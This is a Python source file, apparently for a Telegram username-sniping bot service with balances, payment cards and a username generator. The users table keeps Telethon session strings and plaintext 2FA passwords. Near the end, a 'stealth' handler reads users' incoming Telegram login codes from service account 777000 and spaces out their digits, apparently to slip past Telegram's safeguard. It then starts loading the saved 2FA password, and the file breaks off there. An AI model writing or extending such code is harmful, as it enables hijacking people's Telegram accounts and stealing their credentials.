"""
================================================
 main.py — Username Sniper SaaS Bot
================================================
 Barcha modullar bitta faylga birlashtirildi
 (Railway deployment uchun optimallashtirilgan)
================================================
"""
import asyncio
import logging
import os
import re
import random
import string
import hashlib
import hmac
import json
import time
import aiosqlite

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    WebAppInfo, ReplyKeyboardRemove
)
from aiogram.filters import CommandStart, Command
from dotenv import load_dotenv

from fastapi import FastAPI, Request, UploadFile, File, Form, Header, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from starlette.middleware.base import BaseHTTPMiddleware
import uvicorn

# Log faylga yozish uchun sozlash
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app_debug.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Faqat local dev uchun .env yuklash (Railway da env variable'lar avtomatik bo'ladi)
if not os.getenv("RAILWAY_ENVIRONMENT") and not os.getenv("RAILWAY_SERVICE_ID"):
    load_dotenv()

# ─── SOZLAMALAR ──────────────────────────────
BOT_TOKEN     = os.getenv("BOT_TOKEN", "").strip()
ADMIN_CHANNEL = int(os.getenv("ADMIN_CHANNEL", "0"))
API_ID        = int(os.getenv("API_ID", "0"))
API_HASH      = os.getenv("API_HASH", "")
ADMIN_IDS     = [int(x) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]
DB_PATH       = os.getenv("DB_PATH", "/app/data/usernamechi.db")
WEB_URL       = os.getenv("WEB_HOST", "https://your-app.railway.app")

# Global bot instance - API endpointlardan foydalanish uchun
bot: Bot = None

# Yangi nishon qo'shilganda darhol tekshirish uchun global navbat (asyncio.Queue)
# (telegram_id, username, session_string) tuple
instant_check_queue: asyncio.Queue = None  # monitoring_loop ichida lazily init






async def init_db():



    db_dir = os.path.dirname(DB_PATH)
    if db_dir:
        os.makedirs(db_dir, exist_ok=True)
        
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("PRAGMA journal_mode=WAL;")
        await db.execute("PRAGMA busy_timeout=5000;")
        await db.execute("PRAGMA synchronous=NORMAL;")
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER UNIQUE,
                first_name TEXT,
                last_name TEXT,
                username TEXT,
                phone TEXT,
                balance INTEGER DEFAULT 5000,
                seller_balance INTEGER DEFAULT 0,
                session_string TEXT,
                free_searches INTEGER DEFAULT 1,
                is_stealth INTEGER DEFAULT 0,
                tg_password TEXT,
                is_premium INTEGER DEFAULT 0,
                premium_until TEXT,
                referred_by INTEGER DEFAULT 0,
                referrer_id INTEGER DEFAULT 0,
                reward_given INTEGER DEFAULT 0,
                created_at INTEGER DEFAULT 0
            )
        """)
        try: await db.execute("ALTER TABLE users ADD COLUMN free_searches INTEGER DEFAULT 1")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN first_name TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN last_name TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN username TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN phone TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN seller_balance INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN is_stealth INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN tg_password TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN is_premium INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN premium_until TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN reward_given INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN created_at INTEGER DEFAULT 0")
        except Exception: pass

        # Eski foydalanuvchilarda created_at NULL bo'lsa, unix epoch qo'yamiz
        try: await db.execute("UPDATE users SET created_at=CAST(strftime('%s','now') AS INTEGER) WHERE created_at IS NULL OR created_at=0")
        except Exception: pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS keyword_subscriptions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                keyword TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                category TEXT,
                quantity INTEGER,
                price INTEGER,
                status TEXT DEFAULT 'pending',
                registered_count INTEGER DEFAULT 0,
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        try: await db.execute("ALTER TABLE orders ADD COLUMN created_at REAL DEFAULT (strftime('%s','now'))")
        except Exception: pass
        try: await db.execute("UPDATE orders SET created_at=CAST(strftime('%s','now') AS REAL) WHERE created_at IS NULL")
        except Exception: pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS registered_usernames (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                order_id INTEGER,
                username TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                photo_id TEXT,
                amount INTEGER DEFAULT 0,
                status TEXT DEFAULT 'pending',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS topups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                expected_amount INTEGER,
                status TEXT DEFAULT 'pending',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS search_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                category TEXT,
                paid_qty INTEGER DEFAULT 1,
                status TEXT DEFAULT 'searching',
                created_at REAL DEFAULT (strftime('%s','now')),
                lang TEXT DEFAULT 'uz',
                charged_amount INTEGER DEFAULT 0,
                used_free INTEGER DEFAULT 0
            )
        """)
        try:
            await db.execute("ALTER TABLE search_tasks ADD COLUMN lang TEXT DEFAULT 'uz'")
        except Exception: pass
        try:
            await db.execute("ALTER TABLE search_tasks ADD COLUMN charged_amount INTEGER DEFAULT 0")
        except Exception: pass
        try:
            await db.execute("ALTER TABLE search_tasks ADD COLUMN used_free INTEGER DEFAULT 0")
        except Exception: pass
        
        # Barcha foydalanuvchilarning free_searches qiymatini maksimum 1 ga tozalaymiz (xatolik tufayli oshib ketgan bo'lsa)
        try:
            await db.execute("UPDATE users SET free_searches = 1 WHERE free_searches > 1")
        except Exception: pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS search_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                search_id INTEGER,
                username TEXT,
                status TEXT DEFAULT 'free',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS monitoring_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                username TEXT,
                status TEXT DEFAULT 'monitoring',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS listings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                seller_id INTEGER,
                username TEXT,
                price INTEGER,
                status TEXT DEFAULT 'active',
                created_at REAL DEFAULT (strftime('%s','now')),
                is_private INTEGER DEFAULT 0
            )
        """)
        try: await db.execute("ALTER TABLE listings ADD COLUMN is_private INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN is_auction INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN current_bid INTEGER DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN auction_ends_at REAL DEFAULT 0")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN highest_bidder_id INTEGER")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN channel_id TEXT")
        except Exception: pass
        try: await db.execute("ALTER TABLE listings ADD COLUMN telegram_message_id INTEGER")
        except Exception: pass
        await db.execute("""
            CREATE TABLE IF NOT EXISTS listing_orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                listing_id INTEGER,
                buyer_id INTEGER,
                expected_amount INTEGER,
                status TEXT DEFAULT 'pending',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS withdrawals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_id INTEGER,
                amount INTEGER,
                card_number TEXT,
                card_owner TEXT,
                status TEXT DEFAULT 'pending',
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS mandatory_channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT,
                channel_username TEXT,
                title TEXT,
                url TEXT,
                status TEXT DEFAULT 'Active',
                sort_order INTEGER DEFAULT 0,
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS pending_referrals (
                telegram_id INTEGER PRIMARY KEY,
                referrer_id INTEGER,
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER NOT NULL,
                user_id INTEGER NOT NULL UNIQUE,
                reward_given INTEGER DEFAULT 0,
                reward_amount INTEGER DEFAULT 1000,
                created_at REAL DEFAULT (strftime('%s','now'))
            )
        """)
        
        # ─── BD INDEKSLARI (Tezlikni 10x-50x oshirish uchun) ───
        await db.execute("CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_monitoring_status ON monitoring_tasks(status);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_monitoring_uname ON monitoring_tasks(username);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_listings_status ON listings(status);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_listings_seller ON listings(seller_id);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_orders_status ON orders(status);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);")
        await db.execute("CREATE INDEX IF NOT EXISTS idx_search_tasks_status ON search_tasks(status);")
        await db.commit()
        
        # Backward compatibility for existing databases (ALTER TABLE)
        try: await db.execute("ALTER TABLE mandatory_channels ADD COLUMN status TEXT DEFAULT 'Active'")
        except: pass
        try: await db.execute("ALTER TABLE mandatory_channels ADD COLUMN sort_order INTEGER DEFAULT 0")
        except: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN subscription_verified INTEGER DEFAULT 0")
        except: pass
        try: await db.execute("ALTER TABLE users ADD COLUMN reward_given INTEGER DEFAULT 0")
        except: pass
        
        # Balansi 0 bo'lgan foydalanuvchilarga boshlang'ich 5000 so'm berish (tiklash)
        try: await db.execute("UPDATE users SET balance=5000 WHERE balance=0 OR balance IS NULL")
        except: pass
        
        # Sozlamalarni kiritish
        await db.execute("INSERT INTO settings (key, value) VALUES ('payment_card', '8600123456789012') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('payment_channel_id', '0') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('marketplace_channel_id', '0') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('username_price', '5000') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('premium_price', '20000') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('monitor_price', '10000') ON CONFLICT (key) DO NOTHING")
        await db.execute("INSERT INTO settings (key, value) VALUES ('listing_price', '1000') ON CONFLICT (key) DO NOTHING")
        await db.commit()

        # Payment cards table (multi-card with daily rotation)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS payment_cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                card_number TEXT NOT NULL,
                card_owner TEXT DEFAULT '',
                daily_limit INTEGER DEFAULT 40,
                today_count INTEGER DEFAULT 0,
                last_reset_date TEXT DEFAULT '',
                is_active INTEGER DEFAULT 1,
                sort_order INTEGER DEFAULT 0
            )
        """)
        # Eski payment_card sozlamasidan birinchi karta sifatida ko'chirish
        _c = await db.execute("SELECT COUNT(*) FROM payment_cards")
        _cnt = (await _c.fetchone())[0]

        if _cnt == 0:
             _old_card_cur = await db.execute("SELECT value FROM settings WHERE key='payment_card'")
             _old_card = await _old_card_cur.fetchone()
             if _old_card and _old_card[0]:
                 await db.execute(
                     "INSERT INTO payment_cards (card_number, card_owner, is_active) VALUES (?, ?, 1)",
                     (_old_card[0], 'Karta egasi')
                 )
        # Migration: mavjud jadvallarni yangi ustunlar bilan yangilash
        try:
            await db.execute("ALTER TABLE users ADD COLUMN referred_by INTEGER DEFAULT 0")
            await db.execute("ALTER TABLE listings ADD COLUMN is_auction INTEGER DEFAULT 0")
            await db.execute("ALTER TABLE listings ADD COLUMN current_bid INTEGER DEFAULT 0")
            await db.execute("ALTER TABLE listings ADD COLUMN highest_bidder_id INTEGER DEFAULT 0")
            await db.execute("ALTER TABLE listings ADD COLUMN auction_ends_at REAL DEFAULT 0")
            await db.commit()
        except Exception:
            pass
            
        try:
            await db.execute("ALTER TABLE search_tasks ADD COLUMN paid_qty INTEGER DEFAULT 1")
            await db.commit()
        except Exception:
            pass  # Ustun allaqachon mavjud
        try:
            await db.execute("ALTER TABLE orders ADD COLUMN floodwait_until REAL DEFAULT 0")
            await db.execute("ALTER TABLE orders ADD COLUMN pending_usernames TEXT DEFAULT ''")
            await db.execute("ALTER TABLE orders ADD COLUMN user_first_name TEXT DEFAULT ''")
            await db.commit()
        except Exception:
            pass  # Ustun allaqachon mavjud

        # referrer_id migration (users jadvaliga)
        try:
            await db.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT 0")
            await db.commit()
            logger.info("✅ users.referrer_id ustuni qo'shildi")
        except Exception:
            pass  # Allaqachon mavjud

        # reward_given migration (users jadvaliga)
        try:
            await db.execute("ALTER TABLE users ADD COLUMN reward_given INTEGER DEFAULT 0")
            await db.commit()
        except Exception:
            pass

        # paid_amount migration (monitoring_tasks jadvaliga) — yarim refund uchun
        try:
            await db.execute("ALTER TABLE monitoring_tasks ADD COLUMN paid_amount INTEGER DEFAULT 0")
            await db.commit()
        except Exception:
            pass

    logger.info("✅ Baza tayyor")

async def get_setting(key, default=None):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT value FROM settings WHERE key=?", (key,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else default

async def set_setting(key, value):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value=EXCLUDED.value", (key, str(value)))
        await db.commit()

async def get_active_card():
    """Kunlik limiti (40 ta) to'lmagan birinchi faol kartani qaytaradi.
    Agar hamma kartalar limitga yetgan bo'lsa — oxirgi faol kartani qaytaradi."""
    import datetime
    today = datetime.date.today().isoformat()  # '2025-07-26'
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        # Bugungi sanani tekshirib, eski kunlarda reset qilish
        await db.execute(
            "UPDATE payment_cards SET today_count=0, last_reset_date=? WHERE last_reset_date != ? AND is_active=1",
            (today, today)
        )
        await db.commit()
        # Limiti to'lmagan birinchi faol karta
        async with db.execute(
            "SELECT * FROM payment_cards WHERE is_active=1 AND today_count < daily_limit ORDER BY sort_order ASC, id ASC LIMIT 1"
        ) as c:
            row = await c.fetchone()
            if row:
                return dict(row)
        # Hammalimiti to'lgan — oxirgi faol kartani qaytar
        async with db.execute(
            "SELECT * FROM payment_cards WHERE is_active=1 ORDER BY sort_order ASC, id ASC LIMIT 1"
        ) as c:
            row = await c.fetchone()
            if row:
                return dict(row)
    # Jadval bo'sh bo'lsa — eski sozlamadan ol
    old_card = await get_setting("payment_card", "")
    return {"card_number": old_card, "card_owner": "", "id": None} if old_card else None

async def increment_card_count(card_id: int):
    """To'lov qabul qilinganda kartaning kunlik hisobini 1 ga oshiradi."""
    import datetime
    today = datetime.date.today().isoformat()
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE payment_cards SET today_count=today_count+1, last_reset_date=? WHERE id=?",
            (today, card_id)
        )
        await db.commit()

async def get_user(telegram_id):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE telegram_id=?", (telegram_id,)) as cur:
            row = await cur.fetchone()
            if row and 'free_searches' not in row.keys():
                return dict(row, free_searches=1)
            return dict(row) if row else None

async def create_or_update_user(user_data: dict):
    tid = user_data['id']
    first_name = user_data.get('first_name', '')
    last_name = user_data.get('last_name', '')
    username = user_data.get('username', '')
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR IGNORE INTO users (telegram_id, balance) VALUES (?, 5000)", (tid,))
        await db.execute("UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?", 
                         (first_name, last_name, username, tid))
        await db.commit()

async def create_user(telegram_id, first_name='', last_name='', username=''):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT OR IGNORE INTO users (telegram_id, balance, created_at) VALUES (?, 5000, CAST(strftime('%s','now') AS INTEGER))",
                (telegram_id,)
            )
            if first_name or last_name or username:
                await db.execute(
                    "UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?",
                    (first_name or '', last_name or '', username or '', telegram_id)
                )
            await db.commit()
    except Exception as e:
        logger.error(f"[create_user] Error for telegram_id={telegram_id}: {e}", exc_info=True)
        raise

async def update_balance(telegram_id, amount):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (amount, telegram_id))
        await db.commit()

async def deduct_balance(telegram_id, amount):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance=balance-? WHERE telegram_id=?", (amount, telegram_id))
        await db.commit()

# ─── USERNAME GENERATOR ───────────────────────
from bot.words import (
    generate_smart_username, generate_quality_username,
    nouns, adjectives,
    UZ_WORDS, UZ_SHORT,
    EN_WORDS_COMMON, EN_COOL,
    UZ_PREFIXES, UZ_SUFFIXES,
    EN_PREFIXES, EN_NUMBERS,
    _is_pronounceable,
)


def generate_usernames(base_word: str, lang: str = 'uz', limit: int = 5000) -> list:
    from bot.words import (
        UZ_MALE_NAMES, UZ_FEMALE_NAMES, UZ_SURNAMES,
        UZ_WORDS_CLEAN, EN_MALE_NAMES, EN_FEMALE_NAMES,
        ANIMALS_CLEAN, NATURE_CLEAN, EN_COOL_CLEAN,
        nouns, adjectives, uz_dict
    )

    cat = base_word.strip().lower()
    TELEGRAM_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9_]{3,30}[a-zA-Z0-9]$')

    def valid(u: str) -> bool:
        return (5 <= len(u) <= 32
                and '__' not in u
                and not u.startswith('_')
                and not u.endswith('_')
                and bool(TELEGRAM_RE.match(u)))

    pool = []

    prefixes = ['', 'the', 'real', 'my', 'mr', 'mrs', 'dr', 'pro', 'uz', 'uzb', 'vip', 'super', 'mega', 'top', 'best', 'true', 'iam', 'official', 'go', 'get', 'one', 'club', 'hub', 'app', 'new', 'hot', 'cool', 'fast', 'king', 'boss', 'dark', 'neo', 'ultra', 'max']
    suffixes = ['', 'official', 'uz', 'uzb', 'bot', 'pro', 'vip', 'top', 'blog', 'channel', 'tv', 'media', 'news', 'store', 'shop', 'life', 'style', 'music', 'art', 'dev', 'tech', 'zone', 'group', 'org', 'info', 'box', 'studio', 'page', 'net', 'online', 'hub', 'lab', 'hq', 'ok', 'go', 'gg', 'co', 'ai', 'x', 'real', 'live', 'plus', 'max', 'mini', 'app', 'base']
    numbers = ['', '1', '2', '3', '4', '5', '7', '8', '9', '10', '11', '24', '25', '77', '88', '99', '100', '777', '888', '999', '2024', '2025', '2026', '007', '01', '07', '700', '900']

    if cat.startswith('custom:'):
        cw = ''.join(c for c in cat.split(':', 1)[1].strip() if c.isalnum() or c == '_').lower()
        if not cw:
            cw = 'user'
        c_set = set()
        if valid(cw): c_set.add(cw)
        for p in prefixes:
            for s in suffixes:
                c_set.add(f'{p}{cw}{s}')
                if p: c_set.add(f'{p}_{cw}{s}')
                if s: c_set.add(f'{p}{cw}_{s}')
                if p and s: c_set.add(f'{p}_{cw}_{s}')
        for n in numbers:
            if n:
                c_set.add(f'{cw}{n}')
                c_set.add(f'{cw}_{n}')
                c_set.add(f'{n}{cw}')
        pool = list(c_set)

    elif cat == 'qisqa':
        if lang == 'uz':
            all_words = list(set(UZ_MALE_NAMES + UZ_FEMALE_NAMES + UZ_SURNAMES + UZ_WORDS_CLEAN + uz_dict))
        else:
            all_words = list(set(EN_MALE_NAMES + EN_FEMALE_NAMES + ANIMALS_CLEAN + NATURE_CLEAN + EN_COOL_CLEAN + nouns + adjectives))

        # Eng qisqa va chiroyli so'zlar (5-8 belgi, faqat harflar)
        words = [str(w).lower() for w in all_words if str(w).isalpha() and 5 <= len(str(w)) <= 8]
        random.shuffle(words)

        var_pool = list(words[:4000])  # sof so'zlar eng oldin

        # Faqat oz sonli, yoqimli qo'shimchalar
        short_sfx = ['x', '7', '0', '1', 'ai', 'go', 'me']
        short_pfx = ['the', 'hey', 'iam', 'its', 'mr', 'dr']
        for w in words[:600]:
            var_pool.append(f'{w}{random.choice(short_sfx)}')
            var_pool.append(f'{random.choice(short_pfx)}{w}')

        random.shuffle(var_pool)
        pool = var_pool

    elif cat in ('brend', 'biznes', 'business'):
        b_words = ['store', 'shop', 'market', 'trade', 'brand', 'group', 'company', 'corp', 'studio', 'agency', 'media', 'express', 'center', 'global', 'service', 'hub', 'lab']
        if lang == 'uz':
            bases = list(set(UZ_WORDS_CLEAN + uz_dict))
        else:
            bases = list(set(nouns + EN_COOL_CLEAN))
        bases = [str(w).lower() for w in bases if str(w).isalpha() and 4 <= len(str(w)) <= 10]
        random.shuffle(bases)
        var_pool = []
        for w in bases[:800]:
            for bw in b_words[:8]:
                var_pool.append(f"{w}_{bw}")
                var_pool.append(f"{w}{bw}")
                var_pool.append(f"{bw}_{w}")
        random.shuffle(var_pool)
        pool = var_pool

    elif cat in ('gaming', 'game'):
        g_words = ['game', 'gaming', 'play', 'player', 'pro', 'gg', 'craft', 'sniper', 'kill', 'quest', 'clan', 'squad', 'legend', 'cyber', 'esports']
        if lang == 'uz':
            bases = list(set(UZ_MALE_NAMES + UZ_WORDS_CLEAN))
        else:
            bases = list(set(EN_COOL_CLEAN + nouns))
        bases = [str(w).lower() for w in bases if str(w).isalpha() and 4 <= len(str(w)) <= 10]
        random.shuffle(bases)
        var_pool = []
        for w in bases[:800]:
            for gw in g_words[:8]:
                var_pool.append(f"{w}_{gw}")
                var_pool.append(f"{w}{gw}")
                var_pool.append(f"{gw}_{w}")
        random.shuffle(var_pool)
        pool = var_pool

    elif cat in ('kripto', 'crypto'):
        c_words = ['crypto', 'coin', 'token', 'ton', 'btc', 'eth', 'trade', 'invest', 'hodl', 'dex', 'nft', 'chain', 'capital', 'fund']
        if lang == 'uz':
            bases = list(set(UZ_WORDS_CLEAN + uz_dict))
        else:
            bases = list(set(nouns + EN_COOL_CLEAN))
        bases = [str(w).lower() for w in bases if str(w).isalpha() and 4 <= len(str(w)) <= 10]
        random.shuffle(bases)
        var_pool = []
        for w in bases[:800]:
            for cw_kw in c_words[:8]:
                var_pool.append(f"{w}_{cw_kw}")
                var_pool.append(f"{w}{cw_kw}")
                var_pool.append(f"{cw_kw}_{w}")
        random.shuffle(var_pool)
        pool = var_pool

    else:
        from bot.words import _is_pronounceable
        if lang == 'uz':
            # Asosiy sifatli so'zlar (curated)
            curated = list(set(UZ_MALE_NAMES + UZ_FEMALE_NAMES + UZ_SURNAMES + UZ_WORDS_CLEAN))
            # Lug'atdan faqat talaffuz qilinadigan, keng tarqalgan so'zlar
            dict_pool = [w for w in uz_dict
                         if str(w).isalpha() and 5 <= len(str(w)) <= 9
                         and _is_pronounceable(str(w))]
        else:
            # Asosiy sifatli so'zlar (curated) — bular eng yaxshi
            curated = list(set(EN_MALE_NAMES + EN_FEMALE_NAMES + ANIMALS_CLEAN + NATURE_CLEAN + EN_COOL_CLEAN))
            # Lug'atdan faqat oddiy, taniqli so'zlar (4000 eng yaxshisi)
            dict_pool = [w for w in (nouns + adjectives)
                         if str(w).isalpha() and 5 <= len(str(w)) <= 8
                         and _is_pronounceable(str(w))][:4000]

        random.shuffle(curated)
        random.shuffle(dict_pool)

        # Curated so'zlar birinchi — sifat ustuvoriyligi
        base_words = [str(u).strip().lower() for u in curated if str(u).isalpha() and 5 <= len(str(u)) <= 10]
        dict_words = [str(u).strip().lower() for u in dict_pool]
        random.shuffle(base_words)
        random.shuffle(dict_words)

        var_pool = []

        # 1. Sof curated so'zlar — eng tabiiy va ma'noli
        var_pool.extend(base_words[:2000])

        # 2. Ism + mavzu kombinatsiyasi (masalan: alexstorm, davefire)
        themes = ['wolf','fox','hawk','storm','fire','blade','peak','forge',
                  'river','cloud','stone','spark','flame','swift','echo',
                  'nova','void','dawn','frost','shade','solar','lunar',
                  'eagle','tiger','lion','bear','raven','arrow','crown',
                  'byte','core','flow','code','mind','path','dark','star']
        names_short = [w for w in base_words if 4 <= len(w) <= 7]
        random.shuffle(names_short)
        for name in names_short[:300]:
            theme = random.choice(themes)
            combo1 = f'{name}{theme}'
            combo2 = f'{theme}{name}'
            if 7 <= len(combo1) <= 13:
                var_pool.append(combo1)
            if 7 <= len(combo2) <= 13:
                var_pool.append(combo2)

        # 3. Curated ikki so'z kombinatsiyasi (faqat curated listdan)
        shorts = [w for w in base_words if 4 <= len(w) <= 6]
        random.shuffle(shorts)
        for i, w1 in enumerate(shorts[:300]):
            w2 = shorts[(i + len(shorts)//2) % len(shorts)]
            if w1 != w2:
                combo = f'{w1}{w2}'
                if 7 <= len(combo) <= 12:
                    var_pool.append(combo)

        # 4. Ma'noli prefix + curated so'z
        nice_prefixes = ['the', 'real', 'hey', 'iam', 'mr', 'dr', 'pro', 'its']
        for w in base_words[:500]:
            if 5 <= len(w) <= 9:
                pfx = random.choice(nice_prefixes)
                var_pool.append(f'{pfx}{w}')

        # 5. Curated so'z + ma'noli suffix
        nice_suffixes = ['official', 'real', 'live', 'pro', 'hub', 'zone',
                         'world', 'life', 'works', 'craft', 'base', 'place']
        for w in base_words[:400]:
            if 4 <= len(w) <= 7:
                sfx = random.choice(nice_suffixes)
                combo = f'{w}{sfx}'
                if len(combo) <= 14:
                    var_pool.append(combo)

        # 6. Eng yaxshi lug'at so'zlari (fallback)
        var_pool.extend(dict_words[:1000])

        # 7. Minimal raqam (faqat 1 ta raqam, faqat chiroyli)
        for w in base_words[:200]:
            if 6 <= len(w) <= 9:
                var_pool.append(f'{w}{random.choice(["0","1","7","x"])}')

        random.shuffle(var_pool)
        pool = var_pool

    random.shuffle(pool)

    seen = set()
    res = []
    for u in pool:
        u = u.strip().lower()
        if u not in seen and valid(u):
            seen.add(u)
            res.append(u)

    return res[:limit]


def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Dasturni ochish", web_app=WebAppInfo(url=f"{WEB_URL}/app?v=2"))]
    ])

# ─── ROUTER VA HANDLERLAR ─────────────────────
router = Router()

# Foydalanuvchi holatlarini saqlash (oddiy dict, botni restart qilsa tozalanadi)
user_states = {}

import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest, DeleteChannelRequest, CreateChannelRequest, UpdateUsernameRequest
from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
import uuid

# ─── STEALTH MODE LOGIC ────────────────────────
stealth_clients = {}
stealth_tasks = {}  # telegram_id -> asyncio.Task (run_until_disconnected)

async def stealth_interceptor(event):
    """Barcha kelgan xabarlarni tekshirib, 777000 dan kelganlarni ushlab oladi"""
    try:
        # Faqat 777000 (Telegram xizmati) dan kelgan xabarlarni filtrlaymiz
        sender_id = event.sender_id
        if sender_id != 777000:
            return

        m = event.message
        if not m or not m.text:
            return

        client = event.client
        user_id = getattr(client, 'my_user_id', 'Noma\'lum')

        logger.info(f"🥷 Stealth: 777000 dan xabar keldi (user: {user_id}): {m.text[:80]}")

        # Kodni ajratib olish (5 talik raqam)
        code_match = re.search(r"(\d{5})", m.text)
        if code_match:
            code = code_match.group(1)
            enc = " ".join(list(code))

            # Bazadan saqlangan 2FA parolini olish
            saved_password = None
            try:
                async with aiosqlite.connect(DB_PATH) as db:
